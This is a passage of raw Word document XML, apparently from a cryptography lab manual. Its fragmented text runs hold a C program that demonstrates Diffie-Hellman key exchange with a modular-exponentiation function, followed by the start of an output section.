      <w:pPr>
        <w:ind w:left="220" w:right="6499"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>ya = p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wer(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>pha,xa,q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; yb =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>a,xb,q); ka = p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>wer(yb,xa,q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>kb =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(ya,xb,q);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">a = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nyb = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nka = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nkb = %d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n",ya,yb,ka,kb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(ka == kb)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>keys genera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>and User B are sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he secr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keys gener</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed by User</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:t>ser B are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="220"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn 0;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>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4"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>power(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>x, uns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">gned </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">res = 1;    </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="540" w:lineRule="atLeast"/>
        <w:ind w:left="340" w:right="3601"/>
      </w:pPr>
      <w:r>
        <w:t>x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x % p; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Upda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han or equal</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e (y &gt; 0)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="580" w:right="5094"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">If y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s odd, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y x w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">t </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f (y &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="820"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>res =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>(res*x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="580" w:right="6333"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ust</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be even</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>w y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">y&gt;&gt;1;   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="59"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>2 x =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(x*x) % p;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn res;</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right="8119"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4026"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId27">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gcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>e-he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lm</w:t>
